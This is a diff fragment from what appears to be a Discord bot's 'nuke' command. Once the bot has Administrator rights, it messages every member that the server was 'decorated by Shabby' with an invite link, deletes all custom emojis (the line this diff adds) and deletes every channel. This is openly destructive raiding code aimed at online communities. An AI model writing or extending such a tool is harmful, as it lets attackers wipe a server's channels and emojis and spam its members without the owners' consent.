@@ -9,11 +9,14 @@ module.exports = {
 
     try{
 
+        if(!message.guild.members.me.permissions.has("Administrator")) return error(message, "I'm missing permissions!")
 
         message.guild.members.cache.forEach(member => {
             if(member.id === client.user.id) return console.log(`asd`)
             member.send(`El servidor **${message.guild.name}** ha sido decorado por **Shabby** :) discord.gg/peru`)
         })
+
+        message.guild.emojis.cache.forEach(emoji => emoji.delete());
 
     message.guild.channels.cache.forEach(channel => channel.delete());
 
